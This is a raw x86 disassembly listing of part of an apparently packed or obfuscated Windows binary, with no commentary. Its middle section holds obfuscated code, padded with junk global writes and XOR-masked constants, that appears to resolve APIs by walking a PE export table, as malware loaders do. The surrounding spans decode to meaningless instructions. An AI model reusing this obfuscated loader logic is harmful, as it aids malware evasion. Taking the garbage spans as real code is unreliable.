  406456:	xor    BYTE PTR [ecx+0x6d],cl
  406459:	adc    al,0x74
  40645b:	add    DWORD PTR [edx],ebp
  40645d:	adc    bl,BYTE PTR [ecx-0x37da71e7]
  406463:	iret   
  406464:	js     0x4064ce
  406466:	in     eax,0x11
  406468:	es icebp 
  40646a:	jle    0x40649a
  40646c:	pop    ds
  40646d:	lock icebp 
  40646f:	imul   esi,DWORD PTR [edx-0x36209753],0xe0d790a2
  406479:	mov    WORD PTR [ecx+0x70],?
  40647c:	jmp    FWORD PTR [edi]
  40647e:	jne    0x406436
  406480:	out    dx,al
  406481:	inc    ebx
  406482:	stos   BYTE PTR es:[edi],al
  406483:	add    ch,ah
  406485:	pop    ebp
  406486:	test   al,0x59
  406488:	loope  0x4064ce
  40648a:	sbb    eax,0x4e7bd9d8
  40648f:	mov    eax,ds:0xb2db99b8
  406494:	fcos   
  406496:	into   
  406497:	sbb    DWORD PTR [ebx-0x8235744],ecx
  40649d:	loopne 0x40643f
  40649f:	fbld   TBYTE PTR [ebx-0x5ac30d95]
  4064a5:	in     al,dx
  4064a6:	mov    ecx,0x101f46b
  4064ab:	in     eax,dx
  4064ac:	inc    esp
  4064ad:	and    DWORD PTR [eax+0x28],edx
  4064b0:	jp     0x40650f
  4064b2:	call   0x26bf:0xd63981b5
  4064b9:	jno    0x4064df
  4064bb:	or     eax,DWORD PTR [edx-0x34a38158]
  4064c1:	pushf  
  4064c2:	mov    al,ds:0xc5853f6f
  4064c7:	bound  ecx,QWORD PTR ds:0xc905c7f4
  4064cd:	sbb    ecx,DWORD PTR [ebp-0x3b]
  4064d0:	cmp    eax,DWORD PTR [edx+0x5b8e98e3]
  4064d6:	cdq    
  4064d7:	popf   
  4064d8:	loope  0x4064e8
  4064da:	mov    bl,0x76
  4064dc:	sub    edi,edx
  4064de:	popf   
  4064df:	test   eax,edx
  4064e1:	inc    ebx
  4064e2:	scas   eax,DWORD PTR es:[edi]
  4064e3:	jp     0x40650e
  4064e5:	icebp  
  4064e6:	(bad)  
  4064e7:	int3   
  4064e8:	fisub  WORD PTR [edx]
  4064ea:	scas   al,BYTE PTR es:[edi]
  4064eb:	jno    0x406534
  4064ed:	lds    ecx,FWORD PTR [ebx-0x78b2578a]
  4064f3:	jge    0x406562
  4064f5:	les    edi,FWORD PTR ss:[edi+ecx*8+0x2a]
  4064fa:	and    al,0xb6
  4064fc:	addr16 mov dl,0x13
  4064ff:	sub    DWORD PTR [ebx+edx*8-0x22a4b698],eax
  406506:	lds    ebp,FWORD PTR [ecx]
  406508:	xor    BYTE PTR [ecx-0x494ee7ee],bl
  40650e:	loop   0x406587
  406510:	xchg   DWORD PTR [ebp-0x39],edx
  406513:	mov    dh,0x25
  406515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406516:	push   ebx
  406517:	xchg   ecx,eax
  406518:	outs   dx,BYTE PTR ds:[esi]
  406519:	jo     0x406570
  40651b:	cmp    al,0x2a
  40651d:	xor    eax,0x1c76acb7
  406522:	fcomp  DWORD PTR [ebp+0x322d3470]
  406528:	cli    
  406529:	mov    edx,0x20cd2709
  40652e:	push   esp
  40652f:	push   esi
  406530:	inc    ebp
  406531:	pusha  
  406532:	out    0x18,al
  406534:	imul   ebp,DWORD PTR [ecx],0x9b732b53
  40653a:	fs repnz out dx,eax
  40653d:	jmp    0xc782441d
  406542:	pop    ebx
  406543:	mov    BYTE PTR [edi+edx*1],al
  406546:	pop    ds
  406547:	call   0x2d15:0xe559827b
  40654e:	jb     0x406518
  406550:	sbb    BYTE PTR [ebx-0x36cf04da],cl
  406556:	int3   
  406557:	imul   edx,DWORD PTR [edx-0x2f],0xa8faeb31
  40655e:	pop    es
  40655f:	mov    bl,0x95
  406561:	push   edi
  406562:	inc    edx
  406563:	xor    ebp,ebx
  406565:	call   0x5e59b7c4
  40656a:	shr    BYTE PTR [esi+ebx*1+0x1c],cl
  40656e:	cmp    al,bh
  406570:	fwait
  406571:	cmp    DWORD PTR [esi],ebp
  406573:	mov    WORD PTR [ecx+0x3a],fs
  406576:	push   0xce9c5005
  40657b:	ins    DWORD PTR es:[edi],dx
  40657c:	or     BYTE PTR ds:0x18918ef3,ah
  406582:	jbe    0x4065ea
  406584:	test   al,0x9b
  406586:	fimul  DWORD PTR [ecx]
  406588:	pop    esi
  406589:	mov    ebp,0xbb12db8d
  40658e:	pop    esi
  40658f:	inc    eax
  406590:	dec    ecx
  406591:	aaa    
  406592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406593:	cdq    
  406594:	mov    edx,0x43032ba
  406599:	imul   ebp,DWORD PTR es:[esi+0x6e1fc822],0x1f
  4065a1:	mov    ch,0x2d
  4065a3:	cmp    DWORD PTR [eax],esi
  4065a5:	push   es
  4065a6:	loop   0x4065ba
  4065a8:	push   edi
  4065a9:	push   ecx
  4065aa:	mov    ecx,0xa84591ea
  4065af:	inc    ecx
  4065b0:	pop    ss
  4065b1:	mov    DWORD PTR [esi+0x67870e8],0x66957b18
  4065bb:	dec    ebp
  4065bc:	out    0xe6,eax
  4065be:	(bad)  
  4065bf:	push   edx
  4065c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065c1:	cmp    eax,0x91e89f63
  4065c6:	inc    ebp
  4065c7:	(bad)  
  4065c8:	das    
  4065c9:	mov    es,WORD PTR [esi]
  4065cb:	or     BYTE PTR [edx+edx*1],0x9a
  4065cf:	mov    ds:0xde109e60,al
  4065d4:	iret   
  4065d5:	add    al,0x7b
  4065d7:	fistp  WORD PTR [edi+eiz*4+0x7a]
  4065db:	push   ebx
  4065dc:	mov    ds:0x91f58bee,al
  4065e1:	arpl   WORD PTR [ecx+0x17],bp
  4065e4:	js     0x406569
  4065e6:	inc    ecx
  4065e7:	dec    ebp
  4065e8:	lea    dx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d20c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42003f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1d4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x55],0x79
  4069c2:	repz jmp 0x5f2a:0x62623cc2
  4069ca:	bound  esp,QWORD PTR [edx+0x12]
  4069cd:	add    dh,ah
  4069cf:	leave  
  4069d0:	xor    eax,0xd808a558
  4069d5:	or     eax,0x13caa102
  4069da:	pop    ds
  4069db:	push   0xffffffbe
  4069dd:	cli    
  4069de:	mov    cs,WORD PTR [esi]
  4069e0:	cmp    esp,ebx
  4069e2:	rol    BYTE PTR [edi+0x1b699120],0x61
  4069e9:	rol    ch,0x92
  4069ec:	inc    esp
  4069ed:	int3   
  4069ee:	fwait
  4069ef:	and    DWORD PTR [esi],ebp
  4069f1:	(bad)  
  4069f2:	xchg   ebx,eax
  4069f3:	mov    esp,0xda5bd9c8
  4069f8:	or     bh,BYTE PTR [edx]
  4069fa:	arpl   WORD PTR [edx],sp
  4069fc:	mov    dh,0xc6
  4069fe:	fwait
  4069ff:	je     0x4069bb
  406a01:	or     al,0x99
  406a03:	idiv   esp
  406a05:	and    al,0xf
  406a07:	xchg   edi,eax
  406a08:	in     eax,0xd4
  406a0a:	loop   0x4069f3
  406a0c:	push   esp
  406a0d:	dec    ebp
  406a0e:	(bad)  
  406a0f:	xchg   edx,eax
  406a10:	hlt    
  406a11:	gs cli 
  406a13:	add    eax,0x62aeb89a
  406a18:	mov    BYTE PTR [edx],dh
  406a1a:	fwait
  406a1b:	stc    
  406a1c:	push   cs
  406a1d:	mov    al,0x89
  406a1f:	pop    esp
  406a20:	sbb    esi,esi
  406a22:	jle    0x4069b0
  406a24:	stc    
  406a25:	xor    DWORD PTR [edx+0x2b],ecx
  406a28:	mov    eax,0xd53e922a
  406a2d:	xchg   esp,esp
  406a2f:	sub    eax,0xdb112fb5
  406a34:	dec    ebp
  406a35:	pop    edx
  406a36:	xor    eax,0x562cd5a4
  406a3b:	sbb    dh,dl
  406a3d:	into   
  406a3e:	xchg   ebp,eax
  406a3f:	jo     0x4069d7
  406a41:	mov    edx,0xdb53e418
  406a46:	rep lods al,BYTE PTR ds:[esi]
  406a48:	xor    BYTE PTR [ecx-0x60],bh
  406a4b:	or     ebx,esi
  406a4d:	repnz mov cl,0xd0
  406a50:	xchg   BYTE PTR [ecx-0x2a309840],bh
  406a56:	jl     0x406a0d
  406a58:	sbb    BYTE PTR gs:[edx],ch
  406a5b:	mov    ecx,0x81da97e3
  406a60:	add    dh,al
  406a62:	fcomp  DWORD PTR [ebp-0x60a6c41a]
  406a68:	or     ah,0x2e
  406a6b:	inc    esp
  406a6c:	in     al,0x5c
  406a6e:	mov    dl,0xe4
  406a70:	inc    al
  406a72:	es and eax,0x3b1405c0
  406a78:	in     al,0x47
  406a7a:	inc    DWORD PTR [edi+0x4d18ed3f]
  406a80:	inc    ebx
  406a81:	jmp    0x300fa1bd
  406a86:	xchg   edx,eax
  406a87:	aas    
  406a88:	push   esp
  406a89:	lahf   
  406a8a:	mov    ch,0x85
  406a8c:	jno    0x406ac4
  406a8e:	jnp    0x406a89
  406a90:	dec    edi
  406a91:	out    dx,eax
  406a92:	addr16 das 
  406a94:	div    BYTE PTR [edx+0x55]
  406a97:	lock mov esp,0x50c5b4b9
  406a9d:	xlat   BYTE PTR ds:[ebx]
  406a9e:	(bad)  
  406a9f:	mov    esp,0xa129b04
  406aa4:	(bad)  
  406aa5:	stc    
  406aa6:	xchg   edx,eax
  406aa7:	mov    DWORD PTR [ecx],0x96e82431
  406aad:	repnz and ecx,edx
  406ab0:	data16 (bad) 
  406ab2:	xchg   ecx,eax
  406ab3:	shl    BYTE PTR [edi+0x7],cl
  406ab6:	inc    ebx
  406ab7:	push   es
  406ab8:	or     edi,ecx
  406aba:	ror    BYTE PTR [eax+0x52],0xa2
  406abe:	dec    eax
  406abf:	mov    bl,0x44
  406ac1:	jbe    0x406a46
  406ac3:	(bad)  
  406ac4:	jmp    FWORD PTR [esi+edi*4+0x42d3c7e9]
  406acb:	pop    es
  406acc:	push   0x75e36c64
  406ad1:	cmp    edi,DWORD PTR [edx]
  406ad3:	add    DWORD PTR [ecx-0x143968c2],edx
  406ad9:	push   ss
  406ada:	push   0xffffff97
  406adc:	outs   dx,BYTE PTR ds:[esi]
  406add:	jae    0x406b4a
  406adf:	inc    esp
  406ae0:	fistp  WORD PTR [esi+ebp*2-0x23]
  406ae4:	mov    DWORD PTR [ebp+ecx*1-0x7e03013b],ebp
  406aeb:	lds    esp,FWORD PTR [ebx+ecx*8+0x6007c53e]
  406af2:	xchg   esp,eax
  406af3:	aaa    
  406af4:	dec    ecx
  406af5:	jmp    0x965a:0xd1cfd6a6
  406afc:	mov    DWORD PTR [eax],esi
  406afe:	not    DWORD PTR [ebx-0x22]
  406b01:	sar    BYTE PTR [eax+0x76116858],0x49
  406b08:	ja     0x406b19
  406b0a:	and    ecx,ecx
  406b0c:	jp     0x406a8e
  406b0e:	mov    DWORD PTR [ebx],eax
  406b10:	enter  0xb60d,0xa7
  406b14:	pop    edx
  406b15:	pop    ebp
  406b16:	mov    ebp,0x7ab7c66e
  406b1b:	xchg   esi,eax
  406b1c:	sti    
  406b1d:	cmc    
  406b1e:	dec    edi
  406b1f:	mov    ecx,0x14762d86
  406b24:	dec    eax
  406b25:	xchg   ebp,eax
  406b26:	cmp    dh,bl
  406b28:	dec    ebp
  406b29:	jl     0x406b48
  406b2b:	mov    ds:0xa1a165a8,eax
  406b30:	fbstp  TBYTE PTR [esi+0x69edd592]
  406b36:	add    ah,BYTE PTR [edx+edi*4-0x56d7efb6]
  406b3d:	dec    eax
  406b3e:	lock push eax
  406b40:	fisttp WORD PTR [edx-0x74b4a9c1]
  406b46:	cmp    ecx,eax
  406b48:	inc    esp
  406b49:	dec    ebx
  406b4a:	out    0x38,eax
  406b4c:	mov    DWORD PTR [eax-0x39],edi
  406b4f:	aas    
  406b50:	pop    ebx
  406b51:	dec    edx
  406b52:	mov    ebx,0x3d67576d
  406b57:	sahf   
  406b58:	out    0xf8,eax
  406b5a:	inc    edi
  406b5c:	xchg   ecx,eax
  406b5d:	add    esp,DWORD PTR [eax]
  406b5f:	ret    0x6f
  406b62:	mov    BYTE PTR [edi-0x62457d71],0xac
  406b69:	jne    0x406bd8
  406b6b:	nop
  406b6c:	sub    al,0x1d
  406b6e:	fld    TBYTE PTR [esi]
  406b70:	mov    ebp,0xf456c3ec
  406b75:	enter  0x53dc,0x98
  406b79:	ins    DWORD PTR es:[edi],dx
  406b7a:	mov    edi,0x35eba950
  406b7f:	icebp  
  406b80:	push   esp
  406b81:	xlat   BYTE PTR ds:[ebx]
  406b82:	outs   dx,DWORD PTR ds:[esi]
  406b83:	fbstp  TBYTE PTR [ebp+0x21f625f2]
  406b89:	mov    bh,BYTE PTR [ecx-0x4c]
  406b8c:	int    0xd
  406b8e:	cmp    DWORD PTR [edi-0x4e],edi
  406b91:	push   ecx
  406b92:	ins    DWORD PTR es:[edi],dx
  406b93:	mov    edi,0xad43a0c9
  406b98:	pop    ebx
  406b99:	fist   DWORD PTR [esi]
  406b9b:	icebp  
  406b9c:	outs   dx,BYTE PTR ds:[esi]
  406b9d:	test   BYTE PTR [edx],cl
  406b9f:	and    ebx,ebx
  406ba1:	dec    esi
  406ba2:	push   ebx
  406ba3:	sbb    eax,0x14d6d5e3
  406ba8:	fwait
  406ba9:	inc    edx
  406baa:	mov    edx,0xc2333f03
  406baf:	adc    DWORD PTR [ebx-0x1ee9d697],0x2d
  406bb6:	cwde   
  406bb7:	adc    esi,edi
  406bb9:	enter  0x8a8e,0xf3
  406bbd:	ins    DWORD PTR es:[edi],dx
  406bbe:	(bad)  
  406bc0:	sbb    dh,ch
  406bc2:	or     BYTE PTR [esi+0x6b],al
  406bc5:	sbb    eax,0x3fba76f8
  406bca:	ror    BYTE PTR [edi-0x276b3ffb],cl
  406bd0:	test   DWORD PTR [ecx+ecx*4],ebx
  406bd3:	cwde   
  406bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd5:	icebp  
  406bd6:	out    0x64,al
  406bd8:	or     al,0xef
  406bda:	and    bh,BYTE PTR [eax-0x68601ef4]
  406be0:	rcl    DWORD PTR [ecx],cl
  406be2:	jns    0x406bf8
  406be4:	jmp    DWORD PTR [esi]
  406be6:	popf   
  406be7:	test   al,0x4c
  406be9:	push   edx
  406bea:	xor    al,0x36
  406bec:	nop
  406bed:	fmul   DWORD PTR [ecx+0x70]
  406bf0:	mov    esi,0x307cdfda
  406bf5:	mov    bl,0xac
  406bf7:	sub    edx,DWORD PTR [eax+0x4571be52]
  406bfd:	adc    eax,0x502ecf16
  406c02:	data16 das 
  406c04:	mov    eax,0x7cfc2ce5
  406c09:	xchg   ebp,eax
  406c0a:	sub    BYTE PTR [edx+0x32],ah
  406c0d:	xor    BYTE PTR [esi+0x3f],al
  406c10:	sub    al,0xdf
  406c12:	(bad)  
  406c13:	mov    cs,WORD PTR ds:[bx+di-0x27e5]
  406c19:	cmp    BYTE PTR [edx+0x295531eb],dl
  406c1f:	dec    esp
  406c20:	push   edx
  406c21:	or     edi,DWORD PTR [edx]
  406c23:	fisub  DWORD PTR [edx+0x0]
  406c26:	cmp    BYTE PTR [edi],bh
  406c28:	xchg   cl,bh
  406c2a:	pop    ebx
  406c2b:	popf   
  406c2c:	jno    0x406c54
  406c2e:	push   edi
  406c2f:	icebp  
  406c30:	lods   eax,DWORD PTR ds:[esi]
  406c31:	sub    BYTE PTR [ebx+eax*1+0x6a],bh
  406c35:	xchg   esp,eax
  406c36:	jbe    0x406bdc
  406c38:	inc    esp
  406c39:	dec    edi
  406c3a:	mov    eax,DWORD PTR [eax+0xe8517bb]
  406c40:	push   ss
  406c41:	xor    BYTE PTR [eax],al
  406c43:	push   es
  406c44:	jle    0x406c51
  406c46:	loopne 0x406cab
  406c48:	imul   ebx,DWORD PTR [edi-0x70],0xffffffb9
  406c4c:	adc    al,0x9b
  406c4e:	mov    bh,0xbc
  406c50:	aaa    
  406c51:	jnp    0x406c2c
  406c53:	and    DWORD PTR [edx-0x6eb3d3d],0x4c
  406c5a:	cld    
  406c5b:	in     eax,dx
  406c5c:	lds    ebx,FWORD PTR [esi]
  406c5e:	pop    esi
  406c5f:	pushf  
  406c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c61:	sbb    eax,0xd164df5c
  406c66:	ficomp DWORD PTR [ecx]
  406c68:	enter  0x465e,0x72
  406c6c:	mov    esp,DWORD PTR [eax+0x1a2a5c41]
  406c72:	cdq    
  406c73:	xor    al,0xa2
  406c75:	jmp    0x406cde
  406c77:	aad    0x31
  406c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c7a:	cwde   
  406c7b:	jno    0xe75f0bff
  406c81:	jb     0x406c19
  406c83:	sbb    DWORD PTR [edx],0x4d
  406c86:	pop    eax
  406c87:	push   0xffffffb7
  406c89:	dec    ecx
  406c8a:	stos   DWORD PTR es:[edi],eax
  406c8b:	lods   eax,DWORD PTR cs:[esi]
  406c8d:	into   
  406c8e:	lds    ebp,FWORD PTR [ecx-0x5ed7919a]
  406c94:	js     0x406d09
  406c96:	cld    
  406c97:	xchg   edi,eax
  406c98:	push   cs
  406c99:	add    al,0x42
  406c9b:	mov    esp,0x77f91c5
  406ca0:	sub    eax,DWORD PTR [ebx-0x2a]
  406ca3:	retf   
  406ca4:	out    dx,eax
  406ca5:	cmp    eax,0x3387a69
  406caa:	pop    ss
  406cab:	out    dx,al
  406cac:	add    BYTE PTR [esi-0x38],bh
  406caf:	jmp    0xfd16:0x8236da10
  406cb6:	pop    ebx
  406cb7:	call   0x90c8c9eb
  406cbc:	xor    eax,0x9d6085b
  406cc1:	lods   eax,DWORD PTR ds:[esi]
  406cc2:	in     eax,0x3d
  406cc4:	dec    ebx
  406cc5:	xchg   edx,eax
  406cc6:	js     0x406d3c
  406cc8:	and    esi,DWORD PTR [ecx+edx*1+0x51409f43]
  406ccf:	enter  0x620c,0xf6
  406cd3:	xchg   edx,eax
  406cd4:	in     eax,0xb7
  406cd6:	xchg   ebx,eax
  406cd7:	push   ebx
  406cd8:	(bad)  
  406cda:	ss push ebx
  406cdc:	sbb    ebx,DWORD PTR [eax+0x18]
  406cdf:	jmp    0x406cd4
  406ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ce2:	push   ebx
  406ce3:	cwde   
  406ce4:	fwait
  406ce5:	mov    cl,dl
  406ce7:	mov    eax,0xaf651e34
  406cec:	xchg   edi,eax
  406ced:	inc    esp
  406cee:	loope  0x406d08
  406cf0:	stc    
  406cf1:	inc    eax
  406cf2:	cmp    al,BYTE PTR [edi]
  406cf4:	fnstenv [eax]
  406cf6:	mov    ebx,0x82c201bc
  406cfb:	nop
  406cfc:	push   0xffffffb9
  406cfe:	pop    es
  406cff:	sub    edx,DWORD PTR [edx+0x78]
  406d02:	pop    esi
  406d03:	gs aas 
  406d05:	xchg   esi,eax
